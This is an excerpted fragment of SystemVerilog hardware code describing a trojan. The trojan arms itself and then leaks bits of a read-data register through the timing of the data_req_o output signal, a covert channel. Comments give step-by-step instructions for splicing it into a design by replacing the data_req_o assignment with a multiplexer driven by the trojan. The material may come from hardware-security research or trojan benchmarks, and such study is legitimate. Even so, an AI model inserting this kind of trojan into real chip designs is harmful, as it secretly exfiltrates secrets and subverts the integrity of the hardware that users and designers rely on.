 ...
 * Payload: Modulate data_req_o timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |data_req_o) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of data_req_o:
...
logic       covert_bit_out;         // Drives data_req_o when trojan active
...
//   Find the assign for data_req_o (or rd_error_o as fallback):
//     assign data_req_o = <normal_expr>;
//   Replace with:
//     assign data_req_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
